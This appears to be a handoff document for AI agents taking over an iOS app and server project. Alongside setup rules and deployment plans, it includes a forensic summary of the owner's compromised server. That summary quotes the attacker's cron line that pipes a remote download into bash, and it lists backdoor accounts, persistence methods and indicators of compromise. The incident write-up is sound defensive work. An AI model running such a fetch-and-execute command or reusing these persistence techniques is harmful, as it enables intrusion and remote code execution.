# Handoff: Ergo, as of 2026-11-05

Read this first if you are a new agent picking the project up. It is the whole story: what exists, what is verified, what is not, how Adon wants to work, what happened to his server, and what is left.

Also read `CLAUDE.md` (AGENTS.md is a symlink to it) and `Plans/README.md`. This file does not repeat them.

## How Adon wants to work
- **Git:** never commit, stage, stash or otherwise touch git state. Adon manages git.
- **Simulators:** never boot one, never run the app or UI tests (it cripples his Mac). Verify the app with `xcodebuild … build` only, both `-configuration Debug` and `Release`.
- **Docker:** never install it, on his Mac or any server.
- **Toolchain:** prefix every `swift` and `xcodebuild` with `DEVELOPER_DIR="/Applications/Xcode 27.3 beta 1.app/Contents/Developer"` (Swift 6.4.2).
- **Style:** match the surrounding code. Tabs, `case` indented inside `switch`, short `///` comments saying why, `// MARK: -`, small plain types, errors worded like Swift compiler diagnostics. He writes plain SwiftUI, not UIKit. Persisted settings use sindresorhus/Defaults only; the single exception is the account token in the Keychain.
- **Agents:** he likes liberal use of subagents. Start every agent as Sonnet 5.5 at high effort: `delegate_task` with `target {"providerInstanceId":"claudeAgent","model":"claude-sonnet-5-5","options":{"effort":"high"}}`. Delegates must be told the same hard rules (no git, no simulator, no Docker, DEVELOPER_DIR prefix, style, never use his own Claude/Codex credentials, stay in your folder).
- **Communication:** he gets frustrated by long surveying and caveats. When he says "just do it", do it. Plain, short, honest status; say plainly what is verified and what is not.
- **Other agent:** he said another agent may be working in this repo at the same time. Re-read a file right before editing it, keep edits small, and if a build breaks in code you didn't touch, wait and retry instead of "fixing" it. Never revert changes you don't recognise.
- **Credentials:** never use Adon's own Claude, Codex, OpenAI or Anthropic logins. Never print, log or copy secrets. Tests use fake CLI scripts and obviously fake tokens.

## What Ergo is
An iOS app for learning logic and critical thinking (library of fallacies, biases, philosophers, etc.) with a Check tab: a logic keyboard/editor, a parser and checker, and English → logic translation. Translation runs on a Swift Vapor server Adon hosts; **each user connects their own Claude or ChatGPT account** (Claude Code / Codex CLIs run on the server with the user's own token). Ergo supplies no model access. No Foundation Models, on-device or otherwise (firm decision).

## Repository layout (one repo)
| Path | What |
|---|---|
| `Ergo/` | iOS app, folder-synced into `Ergo.xcodeproj` (new `project.xcproj` format) |
| `Ergo.xcworkspace` | opens the app, ErgoKit, ErgoServer, Evals and Plans together |
| `ErgoKit/` | shared package: `ErgoLogic`, `ErgoTranslation`, `ErgoSync`, `ErgoProtocol`, `ErgoClient` |
| `ErgoServer/` | Vapor 4 server (Postgres in production and SQLite otherwise, via Fluent, swift-crypto vault, vapor/jwt, swift-subprocess) |
| `Evals/` | 92-case corpus and a runner that goes through a running server |
| `Plans/` | design docs: README, 01-ErgoKit, 02-Server, 03-App, 04-Evals, 05-Sync, Fixtures, and this file |
| `Checks/` | only the dither/catalog/library precondition scripts |

All wire types, paths, error codes and the client live in ErgoKit so the app and server cannot disagree. The one deliberate exception is a page's content inside a sync record, which only the app reads (the server treats it as an opaque `JSONValue`).

## What is built
- **ErgoKit:** parser, checker, `LogicEnglish`, `LogicEquivalence`; the translation pipeline (gate, breakdown, formalize, verify; never rename a stage's `name`); the sync engine (`SyncReplica`, hybrid-clock stamps, per-field last-writer-wins, tombstones, conflict copies); `ErgoProtocol` wire types; `ErgoClient` (REST plus WebSockets, short plain-English "Couldn't reach the Ergo server: …" reasons, a `probe()`).
- **ErgoServer:** accounts, per-device tokens, Sign in with Apple, email + password (bcrypt, rate limits), account merge, credential vault (AES-GCM with associated data), translation over `WS v1/translate` driving the real `claude -p` and `codex exec` CLIs with no tools and a per-call run directory, Codex device login, sync (`POST v1/sync`, `WS v1/sync/live`, fields sealed at rest, pruning), Apple server-to-server notifications (`POST v1/apple/notifications`), request logging, `ERGO_TRUST_PROXY`. Routes, env vars and security notes are in `ErgoServer/README.md`; trust that file over this summary.
- **App:** Check tab translation with live progress and Stop; Settings for connecting Claude (setup-token or API key) and ChatGPT (device login, auth.json, API key); Account section (Sign in with Apple, email sign-in/create, change password, add email, sign out, delete account); sync of pages, bookmarks and the settings in `SyncedSetting`; Siri entity links (eight `Open*EntityIntent`s) and library navigation that never truncates the path; a **debug-only** server switch (Production / This Mac) with a Test Server row.
- **Evals:** corpus conventions are in `Plans/README.md` ("English conventions"), shared with `ErgoServer/Sources/ErgoServer/Prompts/Resources/formalize.md`. Scoring compares all premises joined with ∧.

## Verified vs not
Verified by the lead (Nov 5): ErgoKit tests (~155), ErgoServer tests (166), Evals tests (20), app Debug build, a real `ErgoServer` binary on 127.0.0.1 with the evals runner over WebSocket, a fake Claude token rejected by the real `claude` CLI (`credentialRejected`, nothing stored).

**Not verified, do these:**
- The final **Release** app build (the last run was aborted) and a final `swift test` in ErgoServer after the one-line change in `AccountController.swift` (Apple sign-in now uses `request.quietDB`). Re-run all four suites and both builds before declaring anything done.
- **Nothing has run on a device or simulator:** translation, Stop, sync between two devices, Sign in with Apple, email sign-in, the Siri fix.
- **Codex live:** Adon's home network blocks OpenAI. Only fake-script tests exist. A fake-key check from a real server is the first live test.
- **Linux:** nothing has ever been built or run on Linux. The Dockerfile is untested (and we are not using Docker).
- Real Apple tokens and a real Apple notification; behind nginx (`X-Forwarded-For`); password-save/strong-password suggestions (needs a `webcredentials:` associated domain).
- **Open bug:** on his iPhone with the debug "This Mac" server, Settings shows Claude "Connected · verified" but Translate says "Couldn't reach the Ergo server". The server route works from a Mac process. Cause unknown; ranked guesses are server unreachable at that moment, a network layer breaking WebSocket upgrades, or iOS treating `ws://` differently. The new messages and the Test Server row (Settings → Translation → Server, Debug only) will say exactly why. Ask him for the new message and the Mac server's console line for `GET /v1/translate`. The server must run with `--hostname 0.0.0.0` for a phone.

## Decisions and known gaps
- **Accounts:** anonymous until signed in; sync needs Apple or email. One account can hold both. A wrong password has its own code (`invalidCredentials`), never `.unauthorized` (the app treats `.unauthorized` as a dead token and signs out).
- **Email accounts:** emails are **not verified** and there is **no password reset** (needs a mail provider; undecided). Registering a taken email reveals it exists.
- **Release builds always use production;** the production URL is `ServerEnvironment.productionURL` at `Ergo/Translation/ServerEnvironment.swift:18` (`https://ergo-15.235.184.129.sslip.io`).
- **Known limitation, accepted by Adon:** if the server's reply is lost at the exact moment two devices edited the same page, one version can be lost without a copy.
- **Sign in with Apple:** the native flow needs no key. Revoking a user's Apple sign-in on account deletion (App Store requirement, guideline 5.1.1(v)) needs a `.p8` key, Key ID, Team ID (`C2HN547N49`) on the server, and the app sending the sign-in `authorizationCode`. Not built. Ask Adon whether he created the key ("the certificate thing" he mentioned is unexplained: did he enable the capability on `com.omeriadon.Ergo`, create a `.p8`, or something else?).
- **Apple notifications:** once the server has a real host, register `https://<host>/v1/apple/notifications` in the Apple developer portal (Sign in with Apple → Server-to-Server Notification Endpoint). Replay protection (`jti`) is in memory only.
- **Entitlements:** `Ergo/Ergo.entitlements` (Sign in with Apple) is wired; the App ID needs the capability in the portal.

## What happened to his server (rackmill) and why it is being wiped
`ssh rackmill` (root). On Nov 5 the deploy agent found, and the lead confirmed read-only, that the server is compromised. Nothing was deleted or stopped. The only change made: `chattr -ia` on 40 attacker files (Adon asked), so they can be deleted.

**Origin (high confidence on the entry point, not on how the password leaked):**
1. The `medusa` account (created 2026-05-31, in the `sudo` group) has a password, SSH password login is enabled (`PasswordAuthentication yes`, `PermitRootLogin yes`), and SSH is reachable on port 22 **and** on 443 through `sslh` (which makes every external SSH client look like 127.0.0.1, defeating IP bans and hiding sources in logs).
2. About 280 failed password attempts for `medusa` (each logged twice, from 127.0.0.1 and from the server's own address), then **Accepted password for medusa on Oct 13 13:17:10**. One second later (13:17:11) a crontab for medusa was created: `* * * * * curl http://pw.pwndns.pw/?gvc | bash`. That timing means automation, not a person.
3. **Oct 13 14:52:33** another medusa login; **14:52:40** `sudo su` to root succeeded. Root has been attacker-held since then.
4. **Oct 14 22:54:58** a new SSH connection from **165.232.70.109** (a DigitalOcean address) through sslh, accepted as medusa at 22:55:12. At 22:55:49 the attacker logged in as **root with the RSA key labelled "rackmill"** (fingerprint `SHA256:e3pGh/BwZ6xk…`). That key appears exactly once in the retained logs, this login, so it is the attacker's key, already in root's `authorized_keys` before this night. Adon's real keys are ED25519 and have 179 logins from his own addresses.
5. Within five minutes (22:56–23:00:33, scripted, same-second file creation) the attacker dropped everything below.

**What was planted**
- Account `mongo-xz` (home `/opt/mongo-xz`, created 22:57:44) with cron entries running `/media/mdns-git/mdns-git` and `/etc/upnp-nmap/upnp-nmap`, and a backdoor **uid-0 account named `mail`** with `/bin/bash` and a password (entry created the same second).
- `/root/.ssh/.authorized_keys` (hidden copy) and `rackmill` RSA keys in the `authorized_keys` of root, jdqc, masterdaweb and medusa.
- UPX-packed static programs: `fw-dirb`, `eeyyezdoz`, `jwirqcjwr` (identical, sha256 `6dd40542…`, started with `-c -p 443 -tls -k`: an outbound TLS callback), `elastic-hashcat` (sha256 `b0f645bd…`), plus `jevrd`, `smb-ranger`, `blk-knot`, `wkgrfpamhe`, `hostname-mosh`, `zeek-chkrootkit`, `mongo-links2`. Names mimic system tools.
- Persistence in cron.d/hourly/daily/weekly/monthly (`fw-dirb`, `elastic-hashcat`, `mtjtnjysk`), systemd units (`upnp-sxhkd`, `uojwmi`, `hostname-mosh`), SysV scripts in `/etc/init.d`, `/root/.bash_profile` and `/root/.profile` (the first line disables shell history), and `/etc/ld.so.preload` → `libprocesshider.so`, which hides processes named `-bash` from `ps` (this is why the callback to 68.183.123.194:443 had no visible process). Files were timestomped to Aug 25; real creation times are Oct 14 22:56–23:00 (the library's June 2025 date was the attacker's build date, not an earlier break-in).
- Indicators: `pw.pwndns.pw`, `cc.systemctl.cc`, `168.235.95.104`, `68.183.123.194:443`, attacker address `165.232.70.109`. No public hit for any hash or name; the pattern matches generic Linux botnet downloaders.

**Contributing causes:** password auth on a sudo-capable account; SSH exposed on 443 via sslh; everything under pm2 as root; no key-only SSH; no fail2ban visible; the root disk 100% full (13.5 GB pm2 log) and 3.9 GB RAM, so even logging was unreliable.

**Not checked** (Adon stopped a heavy scan): a brute-force /proc scan for hidden processes, and `dpkg -V` for replaced system binaries. Whatever is wiped, assume everything on that host was readable by the attacker for three weeks.

**Everything stored on rackmill must be treated as exposed and rotated from a clean machine:** all SSH keys, including `/root/.ssh/id_ed25519` ("adon-deploy-key-for-wace-server", revoke it wherever it is authorized, e.g. GitHub deploy keys) and the `github-actions-deploy` key in root's `authorized_keys` (rotate the GitHub Actions secret); the Resend, APNs, WeatherKit, R2 and AWS keys the other apps use; `.env` files and pm2 env; database passwords and the Pterodactyl `APP_KEY`; TLS private keys (reissue, revoke if needed).

**Backup of the server (untrusted, nothing extracted or run):** `~/Backups/rackmill-2026-11-05/` (owner-only, about 3.8 GB, `MANIFEST.sha256`, `READ-ME-FIRST.txt`). Contains `/var/www` projects (without node_modules/.build/logs), `/root` projects, `solid-tcg-backend`, pm2 dump, Pterodactyl panel and game data, a Postgres data directory, Redis, `siftr.db` as a SQL dump, a MariaDB TSV export plus a hot raw copy (mysqldump failed because the disk was full), nginx/sing-box/sslh/systemd/Pterodactyl configs, and `forensics/*.txt` (evidence, timeline, keys, logs). Not copied on purpose: ssh keys, AWS credentials, TLS keys. Restore only after checking projects against his git repos and reviewing databases for tampering (users, triggers, events). **The full incident report is `~/Backups/rackmill-2026-11-05/forensics/REPORT.md`**, with the malware binaries (inert tarball, never extract on the Mac), the original scripts/configs, the complete auth.log and syslog set, and the raw investigation output beside it.

## His existing deployment pattern (learned from rackmill, reuse on the new server)
- pm2 6.x on Node 20; apps in `/var/www/<app>`; `ecosystem.config.js` with `env_production` (`HOSTNAME=127.0.0.1`, `PORT`); `pm2-root.service` brings pm2 back on boot; Swift apps are built on the server with `swift build -c release` using swiftly toolchains.
- Deploys: a bare repo `/root/repos/<name>.git` whose `post-receive` hook does `git checkout --force main` into the app directory, builds, `pm2 restart … --update-env` (else `pm2 start <ecosystem> --env production`), then `pm2 save`.
- nginx vhosts in `sites-available` with symlinks in `sites-enabled`; sslh on public 443 forwards TLS to nginx on 127.0.0.1:4433 and SSH to 22; port 80 serves ACME; certbot issues certificates; `proxy_params` sets `X-Forwarded-For`. Domains are `*.adonis.pt` and `*.jdqc.dev`. ufw is on. No backups existed.
- For the new server, do better: a dedicated non-root `ergo` user (and consider not using sslh for ssh), key-only SSH with `PasswordAuthentication no` and `PermitRootLogin prohibit-password` (or no), fail2ban, log rotation, backups of the SQLite DB and the vault key, enough disk and RAM.

## Deploying Ergo (the next big task, once Adon gives a clean server's ssh alias)
1. Survey the new box. Install a current stable Swift toolchain that satisfies `ErgoServer/Package.swift`; the Mac uses a beta Xcode, so the first Linux compile may reveal small portability fixes. Check RAM before building.
2. Install the `claude` (native installer or npm) and `codex` (npm `@openai/codex`) CLIs for the ergo user, pinned. Do **not** log in; each user connects their own token in the app.
3. Generate `ERGO_VAULT_KEY` on the server into a `0600` file (`ERGO_VAULT_KEY_FILE`); tell Adon it is the only way to read stored connections and belongs in his backups. Set `ERGO_APPLE_APP_ID=com.omeriadon.Ergo`, `ERGO_TRUST_PROXY=1` behind nginx, `ERGO_DATABASE_PATH` and `ERGO_RUNS_DIRECTORY` outside the release directory, `ERGO_MAX_PROCESSES` sized to RAM. Evaluate `ERGO_RUNNER_PREFIX`/`ERGO_RUNNER_USER` (setpriv runner user) on bare metal.
4. pm2 + nginx + bare repo/post-receive like his other apps, WebSockets through nginx (Upgrade/Connection headers, `proxy_read_timeout` well over 120 s, no buffering). Put the hook, `ecosystem.config.cjs`, a one-command `ErgoServer/deploy/deploy.sh` and the vhost in `ErgoServer/deploy/` so they are versioned. A failed build must leave the running version untouched. Never run git in the local repo; give Adon the `git remote add` and push commands.
5. Verify from the Mac with throwaway accounts and fake credentials only: `POST /v1/accounts` 200 (and 426 without `Ergo-Protocol-Version`); fake Claude token → 422 `credentialRejected` (proves the CLI runs and reaches Anthropic); fake Codex API key → `credentialRejected` (first live Codex check); WebSocket through the proxy via `cd Evals && ERGO_EVAL_TOKEN=… swift run ErgoEval --server https://<host> --provider claude --case greeting` (expect `notConnected`); `POST /v1/sync` → 403 `signInRequired`; delete the throwaway accounts; confirm logs hold no tokens, emails or English text.
6. Then: set the production URL constant in the app; register the Apple notification URL; add the associated domain for password saving; run the app against production.

## Remaining task list
1. Get Adon's decision and the clean server's ssh alias; deploy as above.
2. Re-verify everything (all four suites, Debug and Release builds), then update `CLAUDE.md` for the workspace, email accounts, Apple notifications and the debug server switch.
3. Diagnose the device connectivity bug with the new error text.
4. Ask Adon about: the "certificate thing" and whether to build Apple token revocation; a mail provider for email verification and password reset; whether to keep the Dockerfile (unused).
5. Longer term: Codex live test from the server, Linux build confirmation, the in-memory-only live-socket broadcaster (one instance only; Redis would be needed for more), and persistence of Apple notification replay protection.
